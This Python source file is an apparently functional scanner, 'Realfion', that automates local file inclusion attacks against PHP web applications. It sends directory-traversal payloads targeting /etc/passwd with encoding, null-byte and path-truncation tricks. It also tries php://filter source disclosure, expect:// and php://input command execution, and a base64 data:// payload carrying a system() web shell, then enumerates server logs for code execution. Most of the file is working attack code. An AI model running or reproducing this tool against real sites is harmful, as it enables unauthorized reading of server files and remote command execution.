from optparse import OptionParser
from time import sleep
import os
import requests
import urllib.parse
import sys
# from termcolor import colored

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

linuxFilenames = []
windowsFilenames = []
macFilenames = []

dirTraversalPrefix = [
    '',
    'C:',
    'D:',
    '../../../../../../../../../../../../../../../..',
    '/../../../../../../../../../../../../../../../..',
    '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..../',
    '/....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..../',
    '/..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././.../.',
]

osLogFiles = {
    'linux': 'Linux.txt',
    'windows': 'Win.txt',
    'mac': 'Mac.txt'
}

def getFilenames():
    linuxFilenames = open('./lfiFiles/Linux.txt', 'r').read().split('\n')
    windowsFilenames = open('./lfiFiles/Win.txt', 'r').read().split('\n')
    macFilenames = open('./lfiFiles/Mac.txt', 'r').read().split('\n')

def addNullByte(str):
    return str + '%00'

def addStrTruncBuffer(str): #~4100 bytes, 4096 needed for php str trunc
    return str + '/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.'

def urlEncode(str, encodeDots=True):
    if encodeDots:
        return urllib.parse.quote(str, safe='').replace('.', '%2E')
    return urllib.parse.quote(str, safe='')

def getTextLen(str):
    return len(str.encode('utf-8'))

class Realfion:
    def __init__(self, options):
        self.url = options.url
        self.os = options.os
        self.page = self.url.split('?')[0].split('/')[-1]
        self.escape_ext = options.escape_ext
        self.urlEncode = options.urlEncode
        self.shouldFindLogs = options.findLogs
        self.checkResponseType()

    def execute(self):
        # if self.os.lower() == 'windows':
        #     self.executeWin()
        # else:
        self.executeLin()

    def checkResponseType(self):
        print('Checking server response..')
        r1 = requests.get(self.url + '?ඖྦྷ⎲')
        r2 = requests.get(self.url + '?ඖඖྦྷ⎲')
        r3 = requests.get(self.url + '?ඖඖඖྦྷ⎲')
        if r1.text == r2.text == r3.text:
            self.responseType = ('nofeedback', getTextLen(r1.text))
            print(f'Detected no feedback from server, going in {bcolors.BOLD}blind{bcolors.ENDC}')
        else:
            self.responseType = ('feedback', max(getTextLen(r1.text), getTextLen(r2.text), getTextLen(r3.text)))
            print(f'Detected some feedback from server, i can {bcolors.BOLD}see!{bcolors.ENDC}')
        print('\n')

    def isLFI(self, respText):
        if self.responseType[0] == 'feedback':
            if ('Warning: include' not in respText and
                'failed to open stream:' not in respText and
                'No such file or directory' not in respText):
                return True
            else:
                return False
        else:
            return getTextLen(respText) != self.responseType[1]

    def encodePayload(self, payload, method):
        for i in range(len(dirTraversalPrefix)):
            if str(i) in method:
                payload = dirTraversalPrefix[i] + payload
                break
        
        if 'urlencoded' in method:
            if 'nodot' in method:
                payload = urlEncode(payload, False)
            else:
                payload = urlEncode(payload, True)
        
        if 'nullbyte' in method:
            payload = addNullByte(payload)
        elif 'phptrunc' in method:
            payload = addStrTruncBuffer(payload)
            
        return payload

    def printRequest(self, file, tlen, tislfi, pl):
            out1 = 'Size: ' + str(tlen) + ' Payload: ' + (pl if len(pl) < 100 else pl[:100] + '{...}') + (f'{bcolors.OKGREEN} --Success{bcolors.ENDC}' if tislfi else '')
            print(out1)
            out2 = 'Size: ' + str(tlen) + ' Payload: ' + pl + (' --Success' if tislfi else '') + '\n'
            file.write(out2)

    def directoryTraversal(self):
        print(f'{bcolors.OKBLUE}Trying directory traversal..{bcolors.ENDC}')

        f = open('output_traversal.txt', 'w+')
        results = []
        payload = self.createTraversalPayloads()
        for (pl, method) in payload:
            r = requests.get(self.url + pl)
            results.append((getTextLen(r.text), pl, r.text, method))
            self.printRequest(f, getTextLen(r.text), self.isLFI(r.text), pl)
        
        print('\n')
        ok = False
        method = ''
        if self.responseType[0] == 'nofeedback':
            results = list(filter(lambda var: var[0] != self.responseType[1], results))
            if len(results) > 0:
                ok = True
                method = results[0][3]
                print(f'{bcolors.OKGREEN}LFI most likely successful with payload: {bcolors.ENDC}' + results[0][1])
                print(f'{bcolors.OKGREEN}Using method: {bcolors.ENDC}' + results[0][3])
        else:
            results.sort(key=lambda tup: tup[0])
            for res in results:
                if ('Warning: include' not in res[2] and
                    'failed to open stream:' not in res[2] and
                    'No such file or directory' not in res[2]):
                    ok = True
                    method = res[3]
                    print(f'{bcolors.OKGREEN}LFI most likely successful with payload: {bcolors.ENDC}' + res[1])
                    print(f'{bcolors.OKGREEN}Using method: {bcolors.ENDC}' + res[3])
                    break

        if not ok:
            print(f'{bcolors.FAIL}Could not perform directory traversal{bcolors.ENDC}, trying wrappers...')
        else:
            print('Output saved to output_traversal.txt')
        return (ok, str(method))

    def lfiWrappers(self):
        ok = False
        print(f'\n\n{bcolors.OKBLUE}Trying php wrappers..{bcolors.ENDC}')
        f = open('output_wrappers.txt', 'w+')
        r = requests.get(self.url + 'php://filter/read=convert.base64-encode/resource=' + self.page.replace('.php', ''))
        ok |= self.isLFI(r.text)
        self.printRequest(f, getTextLen(r.text), self.isLFI(r.text), 'php://filter/read=convert.base64-encode/resource=' + self.page.replace('.php', ''))
        r = requests.get(self.url + 'php://filter/read=convert.base64-encode/resource=' + self.page)
        ok |= self.isLFI(r.text)
        self.printRequest(f, getTextLen(r.text), self.isLFI(r.text), 'php://filter/read=convert.base64-encode/resource=' + self.page)
        r = requests.get(self.url + 'expect://id')
        ok |= (('uid' in r.text) or (self.isLFI(r.text)))
        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or (self.isLFI(r.text)), 'expect://id')
        r = requests.get(self.url + 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id')
        ok |= (('uid' in r.text) or (self.isLFI(r.text)))
        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or (self.isLFI(r.text)), 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id')
        r = requests.post(self.url + 'php://input', data='<?php system("id");?>')
        ok |= (('uid' in r.text) or ((self.isLFI(r.text)) and r.status_code != 403))
        self.printRequest(f, getTextLen(r.text), ('uid' in r.text) or ((self.isLFI(r.text)) and r.status_code != 403), 'php://input   with <?php system("id"); ?> as POST data')

        if not ok:
            print(f'\n{bcolors.FAIL}Could not perform LFI with php wrappers{bcolors.ENDC}, trying RFI...')
        else:
            print('\nOutput saved to output_wrappers.txt')

    def executeLin(self):
        (ok, dirMethod) = self.directoryTraversal()
        if ok:
            if self.shouldFindLogs:
                self.findLogs(dirMethod)
            else:
                inp = input(f'{bcolors.BOLD}Try to find logs?[y/n]:{bcolors.ENDC}')
                if 'y' in inp.lower():
                    self.findLogs(dirMethod)

        if not ok:
            self.lfiWrappers()

    def findLogs(self, method, logFile='./lfiFiles/'):
        print(f'\n{bcolors.OKBLUE}Enumerating server..{bcolors.ENDC}')
        logFile += osLogFiles[self.os]
        fileList = open(logFile, 'r').read().split('\n')
        file = open('output_foundfiles.txt', 'w+')

        foundFiles = []
        for filename in fileList:
            print('Trying: ' + filename)
            payload = self.encodePayload(filename, method)
            r = requests.get(self.url + payload)
            if self.isLFI(r.text):
                print(f'{bcolors.OKGREEN}Found: {bcolors.ENDC}' + filename)
                foundFiles.append(filename)
                file.write(filename + '\n')
        
        print(f'\n{bcolors.OKGREEN}Found files: {bcolors.ENDC}')
        for x in foundFiles:
            print(x)
        print('\nOutput saved in output_foundfiles.txt\n')

    def createTraversalPayloads(self, basefile='/etc/passwd'):
        print('Creating simple payloads..')
        payload = []
        for x in dirTraversalPrefix:
            payload.append((x + basefile, str(dirTraversalPrefix.index(x))))
        if self.urlEncode:
            payloadtemp = payload.copy()
            for (x, y) in payloadtemp:
                payload.append((urlEncode(x), y + ' urlencoded'))
            for (x, y) in payloadtemp:
                if '.' in x:
                    payload.append((urlEncode(x, False), y + ' urlencodednodot'))
        if self.escape_ext:
            payloadtemp = payload.copy()
            for (x, y) in payloadtemp:
                payload.append((addNullByte(x), y + ' nullbyte'))
            for (x, y) in payloadtemp:
                payload.append((addStrTruncBuffer(x), y + ' phptrunc'))
        return payload


def main():
    parser = OptionParser()
    parser.add_option('-u', '--url', dest='url', help='URL that you want to scan (e.g. http://very.secure.com/index.php?page=)')
    parser.add_option('-o', '--operating-system', dest='os', default='linux', help='operating system that the machine is running (linux, windows)')
    parser.add_option('-e', '--dont-escape-extension', action="store_false", dest='escape_ext', default=True, help='if you dont want to try to escape the .php extension with null byte and php string concat')
    parser.add_option('--due', '--dont-url-encode', action='store_false', dest='urlEncode', default=True, help='dont upload payloads that are url encoded, enabled by default')
    parser.add_option('-l', '--logs', action='store_true', dest='findLogs', help='try to find logs (for potential RCE) with the method that LFI detection found (if found)')
    parser.add_option('-m', '--encode-method', '--em', action='store', dest='encodeMethod', help='encode payload with method. separate with ; (e.g. realfion.py -m "/etc/passwd; 1 urlencoded nullbyte")')
    parser.add_option('--lm', '--logs-method', action='store', dest='logsMethod', help='try to find server logs with method specified')
    # parser.print_help()
    (options, args) = parser.parse_args()
    if not options.url:
        print('No URL specified. Exiting..')
        exit()
    realfion = Realfion(options)

    if options.encodeMethod != None:
        x = options.encodeMethod.split(';')
        print(realfion.encodePayload(x[0], x[1]))
    elif options.logsMethod != None:
        realfion.findLogs(options.logsMethod)
    else:
        realfion.execute()

    print('\nPress Enter to continue..')
    input()


if __name__ == "__main__":
    main()
